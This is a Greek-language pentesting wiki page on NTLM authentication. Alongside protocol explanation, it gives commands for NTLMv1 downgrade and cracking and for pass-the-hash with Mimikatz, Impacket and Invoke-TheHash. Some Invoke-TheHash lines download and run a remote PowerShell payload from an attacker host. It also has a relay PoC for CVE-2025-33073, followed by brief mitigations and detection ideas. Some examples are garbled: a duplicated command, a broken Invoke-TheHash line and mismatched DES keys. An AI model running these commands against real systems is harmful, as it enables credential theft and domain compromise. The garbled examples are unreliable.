# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Σε περιβάλλοντα όπου χρησιμοποιούνται τα **Windows XP και Server 2003**, εφαρμόζονται hashes LM (Lan Manager), παρόλο που είναι ευρέως γνωστό ότι μπορούν να παραβιαστούν εύκολα. Ένα συγκεκριμένο hash LM, το `AAD3B435B51404EEAAD3B435B51404EE`, υποδεικνύει ότι δεν χρησιμοποιείται το LM και αντιστοιχεί στο hash μιας κενής συμβολοσειράς.

Από προεπιλογή, το πρωτόκολλο ελέγχου ταυτότητας **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) ενεργοποιείται υπό συγκεκριμένες συνθήκες: απουσία του Active Directory, ανυπαρξία του domain, δυσλειτουργία του Kerberos λόγω εσφαλμένης ρύθμισης ή όταν οι συνδέσεις επιχειρούνται μέσω διεύθυνσης IP αντί για έγκυρο hostname.

Η παρουσία της κεφαλίδας **"NTLMSSP"** στα πακέτα δικτύου υποδεικνύει μια διαδικασία ελέγχου ταυτότητας NTLM.

Η υποστήριξη των πρωτοκόλλων ελέγχου ταυτότητας LM, NTLMv1 και NTLMv2 παρέχεται από μια συγκεκριμένη DLL που βρίσκεται στο `%windir%\Windows\System32\msv1\_0.dll`.

**Βασικά σημεία**:

- Τα hashes LM είναι ευάλωτα και ένα κενό hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) υποδεικνύει ότι δεν χρησιμοποιείται.
- Το Kerberos είναι η προεπιλεγμένη μέθοδος ελέγχου ταυτότητας, ενώ το NTLM χρησιμοποιείται μόνο υπό ορισμένες συνθήκες.
- Τα πακέτα ελέγχου ταυτότητας NTLM αναγνωρίζονται από την κεφαλίδα "NTLMSSP".
- Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το αρχείο συστήματος `msv1\_0.dll`.

## LM, NTLMv1 και NTLMv2

Μπορείτε να ελέγξετε και να ρυθμίσετε ποιο πρωτόκολλο θα χρησιμοποιείται:

### GUI

Εκτελέστε _secpol.msc_ -> Τοπικές πολιτικές -> Επιλογές ασφαλείας -> Ασφάλεια δικτύου: επίπεδο ελέγχου ταυτότητας LAN Manager. Υπάρχουν 6 επίπεδα (από 0 έως 5).

![LM, NTLMv1 και NTLMv2 - GUI: Εκτελέστε secpol.msc - Τοπικές πολιτικές - Επιλογές ασφαλείας - Ασφάλεια δικτύου: επίπεδο ελέγχου ταυτότητας LAN Manager. Υπάρχουν 6 επίπεδα (από 0 έως 5)](<../../images/image (919).png>)

### Μητρώο

Αυτό θα ορίσει το επίπεδο 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Πιθανές τιμές:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Βασικό σχήμα ελέγχου ταυτότητας NTLM σε domain

1. Ο **user** εισάγει τα **credentials** του
2. Το client machine **στέλνει ένα αίτημα ελέγχου ταυτότητας**, στέλνοντας το **domain name** και το **username**
3. Ο **server** στέλνει το **challenge**
4. Ο **client κάνει encrypt** το **challenge** χρησιμοποιώντας ως key το hash του password και το στέλνει ως response
5. Ο **server στέλνει** στον **Domain Controller** το **domain name, το username, το challenge και το response**. Αν **δεν** υπάρχει ρυθμισμένο Active Directory ή το domain name είναι το όνομα του server, τα credentials **ελέγχονται τοπικά**.
6. Ο **Domain Controller ελέγχει αν όλα είναι σωστά** και στέλνει τις πληροφορίες στον server

Ο **server** και ο **Domain Controller** μπορούν να δημιουργήσουν ένα **Secure Channel** μέσω του server **Netlogon**, καθώς ο Domain Controller γνωρίζει το password του server (βρίσκεται μέσα στη βάση δεδομένων **NTDS.DIT**).

### Τοπικό σχήμα ελέγχου ταυτότητας NTLM

Ο έλεγχος ταυτότητας είναι όπως αυτός που αναφέρθηκε **προηγουμένως, αλλά** ο **server** γνωρίζει το **hash του user** που προσπαθεί να πραγματοποιήσει έλεγχο ταυτότητας, μέσα στο αρχείο **SAM**. Επομένως, αντί να ρωτήσει τον Domain Controller, ο **server θα ελέγξει ο ίδιος** αν ο user μπορεί να πραγματοποιήσει έλεγχο ταυτότητας.

### NTLMv1 Challenge

Το **μήκος του challenge είναι 8 bytes** και το **response έχει μήκος 24 bytes**.

Το **hash NT (16bytes)** χωρίζεται σε **3 μέρη των 7bytes το καθένα** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος συμπληρώνεται με μηδενικά**. Στη συνέχεια, το **challenge** κρυπτογραφείται **ξεχωριστά** με κάθε μέρος και τα **κρυπτογραφημένα** bytes που προκύπτουν **συνενώνονται**. Σύνολο: 8B + 8B + 8B = 24Bytes.

**Προβλήματα**:

- Έλλειψη **τυχαιότητας**
- Τα 3 μέρη μπορούν να **δεχτούν επίθεση ξεχωριστά** για να βρεθεί το NT hash
- Το **DES μπορεί να γίνει crack**
- Το 3ο key αποτελείται πάντα από **5 μηδενικά**.
- Με το **ίδιο challenge**, το **response** θα είναι **το ίδιο**. Επομένως, μπορείς να δώσεις ως **challenge** στο θύμα τη συμβολοσειρά "**1122334455667788**" και να επιτεθείς στο response χρησιμοποιώντας **precomputed rainbow tables**.

### Επίθεση NTLMv1

Το unconstrained delegation είναι λιγότερο συνηθισμένο σε σύγχρονα περιβάλλοντα, αλλά η πρόσβαση σε μια **Print Spooler service** μπορεί ακόμη να γίνει κατάχρηση, ώστε να εξαναγκαστεί ο έλεγχος ταυτότητας προς έναν τέτοιο host.

Θα μπορούσες να κάνεις κατάχρηση κάποιων credentials/sessions που έχεις ήδη στο AD για να **ζητήσεις από τον printer να πραγματοποιήσει έλεγχο ταυτότητας** σε κάποιον **host υπό τον έλεγχό σου**. Στη συνέχεια, χρησιμοποιώντας το `metasploit auxiliary/server/capture/smb` ή το `responder`, μπορείς να **ρυθμίσεις το authentication challenge σε 1122334455667788**, να καταγράψεις την προσπάθεια ελέγχου ταυτότητας και, αν έγινε με **NTLMv1**, θα μπορέσεις να το **κάνεις crack**.\
Αν χρησιμοποιείς το `responder`, μπορείς να δοκιμάσεις να **χρησιμοποιήσεις το flag `--lm`** για να προσπαθήσεις να **υποβαθμίσεις** τον **έλεγχο ταυτότητας**.\
_Σημείωση: για αυτή την τεχνική, ο έλεγχος ταυτότητας πρέπει να πραγματοποιείται με NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._

Να θυμάσαι ότι ο printer θα χρησιμοποιήσει τον computer account κατά τον έλεγχο ταυτότητας και οι computer accounts χρησιμοποιούν **μεγάλα και τυχαία passwords**, τα οποία **πιθανότατα δεν θα μπορέσεις να κάνεις crack** χρησιμοποιώντας συνηθισμένα **dictionaries**. Ωστόσο, ο έλεγχος ταυτότητας **NTLMv1 χρησιμοποιεί DES** ([περισσότερες πληροφορίες εδώ](#ntlmv1-challenge)), επομένως με κάποιες υπηρεσίες ειδικά αφιερωμένες στο cracking του DES θα μπορέσεις να το κάνεις crack (για παράδειγμα, μπορείς να χρησιμοποιήσεις το [https://crack.sh/](https://crack.sh) ή το [https://ntlmv1.com/](https://ntlmv1.com)).

### Επίθεση NTLMv1 με hashcat

Το NTLMv1 μπορεί επίσης να δεχτεί επίθεση με το [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), το οποίο μετατρέπει καταγεγραμμένα μηνύματα NTLMv1 σε μορφές κατάλληλες για το Hashcat.<sup>[[1]](#references)</sup>

Η εντολή

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

θα παρήγαγε τα παρακάτω:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Δημιουργήστε ένα αρχείο με το περιεχόμενο:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Εκτελέστε το hashcat (κατά προτίμηση κατανεμημένα μέσω ενός εργαλείου όπως το hashtopolis), καθώς διαφορετικά θα χρειαστούν αρκετές ημέρες.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Σε αυτή την περίπτωση γνωρίζουμε ότι ο κωδικός πρόσβασης είναι password, οπότε θα παρακάμψουμε τη διαδικασία για τις ανάγκες της επίδειξης:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Τώρα πρέπει να χρησιμοποιήσουμε τα hashcat-utilities για να μετατρέψουμε τα σπασμένα κλειδιά DES σε τμήματα του hash NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Τέλος, το τελευταίο μέρος:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Συνδυάστε τα μεταξύ τους:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

Το **μήκος του challenge είναι 8 bytes** και αποστέλλονται **2 responses**: Το ένα έχει μήκος **24 bytes** και το μήκος του **άλλου** είναι **μεταβλητό**.

**Το πρώτο response** δημιουργείται κρυπτογραφώντας με **HMAC_MD5** τη **συμβολοσειρά** που αποτελείται από τον **client και το domain**, χρησιμοποιώντας ως **key** το **hash MD4** του **NT hash**. Στη συνέχεια, το **αποτέλεσμα** χρησιμοποιείται ως **key** για την κρυπτογράφηση του **challenge** με **HMAC_MD5**. Σε αυτό προστίθεται ένα client challenge 8 bytes. Σύνολο: 24 B.

**Το δεύτερο response** δημιουργείται χρησιμοποιώντας **διάφορες τιμές** (ένα νέο client challenge, μια **χρονοσφραγίδα** για την αποφυγή **replay attacks**...)

Αν έχετε ένα **PCAP που περιέχει μια επιτυχημένη ανταλλαγή authentication**, εξαγάγετε το domain, το username, το server challenge και το NTLMv2 response, μορφοποιήστε το capture για το Hashcat και χρησιμοποιήστε το mode `5600` για να επιχειρήσετε την ανάκτηση του password. Ο αρχειοθετημένος πρακτικός οδηγός διατηρεί τη διαδικασία εξαγωγής των πεδίων του πακέτου, ενώ τα παραδείγματα του Hashcat ορίζουν την τρέχουσα αποδεκτή μορφή.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Μόλις αποκτήσετε το hash του θύματος**, μπορείτε να το χρησιμοποιήσετε για να το **υποδυθείτε**.\
Πρέπει να χρησιμοποιήσετε ένα **tool** που θα **εκτελέσει** το **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να **εισαγάγετε** αυτό το **hash** στο **LSASS**, ώστε να χρησιμοποιείται αυτό το **hash** κάθε φορά που εκτελείται **NTLM authentication**. Αυτό κάνει η mimikatz.

**Να θυμάστε ότι μπορείτε να εκτελέσετε επιθέσεις Pass-the-Hash και με Computer accounts.**

### **Mimikatz**

**Πρέπει να εκτελεστεί ως administrator**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Αυτό εκκινεί μια διεργασία με τον τρέχοντα τοπικό χρήστη, ενώ το LSASS συσχετίζει τα παρεχόμενα διαπιστευτήρια με τη σύνδεσή του για εξερχόμενη δικτυακή σύνδεση. Στη συνέχεια, μπορείτε να αποκτήσετε πρόσβαση σε δικτυακούς πόρους ως ο παρεχόμενος χρήστης, όπως με το `runas /netonly`, χωρίς να γνωρίζετε τον απλού κειμένου κωδικό πρόσβασης.

### Pass-the-Hash από linux

Μπορείτε να αποκτήσετε εκτέλεση κώδικα σε μηχανήματα Windows χρησιμοποιώντας Pass-the-Hash από Linux.\
[**Δείτε πρακτικά παραδείγματα εκτέλεσης Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Μεταγλωττισμένα εργαλεία Impacket για Windows

Μπορείτε να κατεβάσετε [τα δυαδικά αρχεία Impacket για Windows από εδώ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Σε αυτήν την περίπτωση, πρέπει να καθορίσετε μια εντολή. Τα cmd.exe και powershell.exe δεν είναι έγκυρα για την απόκτηση διαδραστικού κελύφους.)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Υπάρχουν πολλά ακόμη δυαδικά αρχεία Impacket...

### Invoke-TheHash

Μπορείτε να λάβετε τα scripts powershell από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Αυτή η συνάρτηση συνδυάζει τις προηγούμενες λειτουργίες. Μπορείτε να περάσετε **πολλά hosts**, να εξαιρέσετε επιλεγμένους στόχους και να επιλέξετε _SMBExec, WMIExec, SMBClient,_ ή _SMBEnum_. Αν επιλέξετε **SMBExec** ή **WMIExec** χωρίς παράμετρο _**Command**_, ελέγχει μόνο αν έχετε επαρκή δικαιώματα.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Πρέπει να εκτελεστεί ως διαχειριστής**

Αυτό το εργαλείο κάνει το ίδιο με το mimikatz (τροποποιεί τη μνήμη LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Χειροκίνητη απομακρυσμένη εκτέλεση Windows με όνομα χρήστη και κωδικό πρόσβασης


{{#ref}}
../lateral-movement/
{{#endref}}

## Εξαγωγή διαπιστευτηρίων από έναν Windows Host

Για περισσότερες πληροφορίες, δείτε [**Κλοπή διαπιστευτηρίων Windows**](../stealing-credentials/README.md).

## Επίθεση Internal Monologue

Η επίθεση Internal Monologue είναι μια stealthy τεχνική εξαγωγής διαπιστευτηρίων, που επιτρέπει σε έναν εισβολέα να ανακτήσει NTLM hashes από το μηχάνημα ενός θύματος **χωρίς να αλληλεπιδρά άμεσα με τη διεργασία LSASS**. Σε αντίθεση με το Mimikatz, το οποίο διαβάζει hashes απευθείας από τη μνήμη και συχνά αποκλείεται από λύσεις ασφάλειας endpoint ή το Credential Guard, αυτή η επίθεση αξιοποιεί **τοπικές κλήσεις στο πακέτο ελέγχου ταυτότητας NTLM (MSV1_0) μέσω του Security Support Provider Interface (SSPI)**. Ο εισβολέας αρχικά **υποβαθμίζει τις ρυθμίσεις NTLM** (π.χ. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), ώστε να επιτρέπεται το NetNTLMv1. Στη συνέχεια, υποδύεται υπάρχοντα user tokens που αποκτήθηκαν από διεργασίες σε εκτέλεση και ενεργοποιεί τοπικά τον έλεγχο ταυτότητας NTLM, για να δημιουργήσει αποκρίσεις NetNTLMv1 χρησιμοποιώντας ένα γνωστό challenge.<sup>[[4]](#references)</sup>

Αφού καταγράψει αυτές τις αποκρίσεις NetNTLMv1, ο εισβολέας μπορεί να ανακτήσει γρήγορα τα αρχικά NTLM hashes χρησιμοποιώντας **προϋπολογισμένους rainbow tables**, επιτρέποντας περαιτέρω επιθέσεις Pass-the-Hash για πλευρική μετακίνηση. Είναι σημαντικό ότι η επίθεση Internal Monologue παραμένει stealthy, επειδή δεν δημιουργεί κίνηση δικτύου, δεν εισάγει κώδικα και δεν ενεργοποιεί άμεσες αποτυπώσεις μνήμης, με αποτέλεσμα να είναι δυσκολότερο να εντοπιστεί από τους αμυνόμενους σε σύγκριση με παραδοσιακές μεθόδους όπως το Mimikatz.

Αν το NetNTLMv1 δεν γίνεται αποδεκτό λόγω επιβεβλημένων πολιτικών ασφαλείας, τότε ο εισβολέας ενδέχεται να μην καταφέρει να ανακτήσει απόκριση NetNTLMv1.

Για να αντιμετωπιστεί αυτή η περίπτωση, το εργαλείο Internal Monologue ενημερώθηκε: αποκτά δυναμικά ένα token διακομιστή χρησιμοποιώντας `AcceptSecurityContext()`, ώστε να μπορεί να **καταγράφει αποκρίσεις NetNTLMv2** αν αποτύχει το NetNTLMv1. Παρότι το NetNTLMv2 είναι πολύ δυσκολότερο να σπάσει, εξακολουθεί να ανοίγει τον δρόμο για επιθέσεις relay ή offline brute-force σε περιορισμένες περιπτώσεις.

Το PoC βρίσκεται στο **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay και Responder

**Διαβάστε εδώ τον αναλυτικό οδηγό για την εκτέλεση αυτών των επιθέσεων:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Ανάλυση NTLM challenges από καταγραφή δικτύου

**Μπορείτε να χρησιμοποιήσετε το** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* μέσω Serialized SPNs (CVE-2025-33073)

Τα Windows περιλαμβάνουν διάφορους μετριασμούς που επιχειρούν να αποτρέψουν επιθέσεις *Reflection*, όπου ένας έλεγχος ταυτότητας NTLM (ή Kerberos) που ξεκινά από έναν host αναμεταδίδεται πίσω στον **ίδιο** host, με σκοπό την απόκτηση δικαιωμάτων SYSTEM.

Η Microsoft διέκοψε τις περισσότερες δημόσιες αλυσίδες με τα MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) και μεταγενέστερες ενημερώσεις κώδικα. Ωστόσο, το **CVE-2025-33073** δείχνει ότι οι προστασίες μπορούν ακόμη να παρακαμφθούν με κατάχρηση του τρόπου με τον οποίο ο **SMB client περικόπτει Service Principal Names (SPNs)** που περιέχουν *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR του σφάλματος
1. Ένας εισβολέας καταχωρίζει μια **DNS A-record** με label που κωδικοποιεί ένα marshalled SPN – π.χ.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Το θύμα εξαναγκάζεται να πραγματοποιήσει έλεγχο ταυτότητας προς αυτό το hostname (PetitPotam, DFSCoerce κ.λπ.).
3. Όταν ο SMB client περνά τη συμβολοσειρά-στόχο `cifs/srv11UWhRCAAAAA…` στη `lsasrv!LsapCheckMarshalledTargetInfo`, η κλήση στη `CredUnmarshalTargetInfo` **αφαιρεί** το serialized blob, αφήνοντας **`cifs/srv1`**.
4. Η `msv1_0!SspIsTargetLocalhost` (ή το αντίστοιχο του Kerberos) θεωρεί πλέον τον στόχο *localhost*, επειδή το σύντομο τμήμα του host ταιριάζει με το όνομα του υπολογιστή (`SRV1`).
5. Ως αποτέλεσμα, ο διακομιστής ορίζει το `NTLMSSP_NEGOTIATE_LOCAL_CALL` και εισάγει το **access-token SYSTEM του LSASS** στο context (για το Kerberos δημιουργείται ένα subsession key με ένδειξη SYSTEM).
6. Η αναμετάδοση αυτού του ελέγχου ταυτότητας με `ntlmrelayx.py` **ή** `krbrelayx.py` παρέχει πλήρη δικαιώματα SYSTEM στον ίδιο host.<sup>[[5]](#references)</sup>

### Γρήγορο PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Ενημερώσεις κώδικα & μέτρα μετριασμού
* Το KB patch για το **CVE-2025-33073** προσθέτει έναν έλεγχο στο `mrxsmb.sys::SmbCeCreateSrvCall`, ο οποίος αποκλείει κάθε σύνδεση SMB της οποίας ο προορισμός περιέχει marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Επιβάλετε **SMB signing** στους προορισμούς SMB relay. Για άλλους προορισμούς, αξιολογήστε τις απαιτήσεις signing ή Extended Protection του ίδιου του πρωτοκόλλου, καθώς και το επίπεδο ενημερώσεων κώδικα· το SMB signing από μόνο του δεν καθορίζει αν είναι δυνατή μια αναμετάδοση HTTPS WinRM.
* Παρακολουθείτε εγγραφές DNS που μοιάζουν με `*<base64>...*` και αποκλείετε διαδρομές εξαναγκασμού (PetitPotam, DFSCoerce, AuthIP...).

### Ιδέες ανίχνευσης
* Καταγραφές δικτύου με `NTLMSSP_NEGOTIATE_LOCAL_CALL`, όπου η IP του client ≠ IP του server.
* Kerberos AP-REQ που περιέχει subsession key και principal client ίσο με το hostname.
* Συνδέσεις SYSTEM στα Windows Event 4624/4648, αμέσως πριν από απομακρυσμένες εγγραφές SMB από τον ίδιο host.<sup>[[5]](#references)</sup>

Ένα DNS name με σειριοποιημένες πληροφορίες στόχου μπορεί επίσης να κατευθύνει την εξαναγκασμένη αυθεντικοποίηση προς έναν επιτιθέμενο, για **cross-protocol relay** σε ένα web-enrollment endpoint του AD CS. Αυτό είναι διαφορετικό αποτέλεσμα από το same-host reflection: οι [προϋποθέσεις εγγραφής ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), τα δικαιώματα εγγραφής DNS, μια διαδρομή εξαναγκασμού και το επίπεδο ενημερώσεων κώδικα του στόχου πρέπει να αξιολογηθούν ανεξάρτητα.

Για την παραλλαγή local reflection του **Μαρτίου 2026**, η οποία εκμεταλλεύεται **SMB arbitrary ports** και **TCP connection reuse** για να αποκτήσει πρόσβαση ως `NT AUTHORITY\SYSTEM`, δείτε:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Εργαλεία PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Επίθεση Internal Monologue: Ανάκτηση NTLM hashes χωρίς πρόσβαση στο LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [Το NTLM Reflection είναι νεκρό, ζήτω το NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking ενός NTLMv2 hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
